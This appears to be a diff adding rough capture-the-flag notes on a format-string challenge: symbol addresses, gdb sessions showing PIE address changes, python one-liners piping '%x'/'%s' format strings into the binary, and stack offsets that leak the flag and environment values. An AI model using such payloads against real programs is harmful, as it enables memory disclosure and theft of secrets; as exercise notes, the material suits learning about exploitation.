@@ -1,0 +1,44 @@
+
+000006ed <printMessage3>:
+00000725 <printMessage2>:
+0000075e <printMessage1>:
+00000797 <main>:
+
+try to leak the flag from in memory
+
+has PIE on (position independent executable)
+
+
+(gdb) b main
+Breakpoint 1 at 0x7a6
+(gdb) r
+Starting program: /problems/stringzz_1_be55bd3a95666ee400c934d35b674a94/vuln
+
+Breakpoint 1, 0x5662f7a6 in main ()
+
+(gdb) b main
+Breakpoint 1 at 0x7a6
+(gdb) r
+Starting program: /problems/stringzz_1_be55bd3a95666ee400c934d35b674a94/vuln
+
+Breakpoint 1, 0x565b67a6 in main ()
+
+
+seems like flag is at "56...995"
+somewhere between [565xx995 - 566xx995]
+
+%x = hex address value
+%s = string
+
+python -c "print '%x-'*8 + '%s'" | ./vuln
+
+python -c "print '%x %x %x %x %x %x %x %x '*20" | ./vuln
+
+
+format strings
+
+%9$s == flag.txt
+
+%85$s == ./vuln
+
+%100$s == SHELL=/bin/bash
